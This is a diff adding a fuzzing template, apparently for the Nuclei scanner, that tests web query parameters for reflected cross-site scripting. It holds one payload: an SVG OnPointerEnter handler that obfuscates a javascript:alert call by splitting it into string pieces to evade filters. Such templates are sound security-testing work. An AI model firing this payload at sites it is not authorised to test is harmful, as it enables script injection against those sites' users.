@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-pointerenter
+
+info:
+  name: XSS via SVG OnPointerEnter
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect potential XSS vulnerabilities using an SVG OnPointerEnter event.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
